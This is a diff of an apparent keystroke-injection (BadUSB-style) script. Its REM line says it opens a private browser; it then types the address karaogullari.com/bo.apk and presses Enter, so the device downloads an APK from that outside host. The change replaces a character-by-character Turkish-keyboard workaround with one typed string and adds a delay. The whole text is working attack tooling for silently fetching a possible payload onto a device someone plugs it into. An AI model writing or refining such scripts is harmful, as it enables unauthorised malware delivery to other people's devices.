@@ -1,4 +1,5 @@
 REM Opens a private browser
+DELAY 200
 ESCAPE
 GUI d
 ALT ESCAPE
@@ -9,27 +10,7 @@ CTRL SHIFT N
 DELAY 700
 CTRL l
 DELAY 300
-STRING karaogullari
-DELAY 300
-REM Dot character for Turkish keyboard
-ALT_SPACE
-DELAY 300
-DOWNARROW
-ENTER
-DELAY 300
-STRING com
-DELAY 300
-REM Slash character for Turkish keyboard
-SHIFT ;
-DELAY 300
-STRING bo
-DELAY 300
-ALT_SPACE
-DELAY 300
-DOWNARROW
-ENTER
-DELAY 300
-STRING apk
+STRING karaogullari.com/bo.apk
 DELAY 300
 ENTER
 DELAY 5000
